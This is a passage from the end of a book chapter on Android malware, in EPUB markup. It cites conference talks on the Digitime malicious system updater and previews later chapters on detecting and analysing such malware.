<p class="indent">Additional information about the technical capabilities of the Digitime software and how they evolved over time was published by the Android Security team at the 2022 Virus Bulletin and 2023 BotConf conferences, in two presentations titled “You OTA Know: Combating Malicious Android System Updaters.”<span epub:type="pagebreak" id="page_67"/></p>&#13;
<h3 class="h3" id="ch02lev5"><strong>Up Next</strong></h3>&#13;
<p class="noindent">This chapter reviewed 10 years’ worth of Android malware found in the wild. While not exhaustive, the families, samples, and properties introduced here serve as useful examples of what Android malware looks like and how it operates. The rest of the book describes how to detect and analyze such malware.<span epub:type="pagebreak" id="page_68"/></p>&#13;
</div>
</div>
<div style="float: none; margin: 10px 0px 10px 0px; text-align: center;"><p><a href="https://oceanofpdf.com"><i>OceanofPDF.com</i></a></p></div></body></html>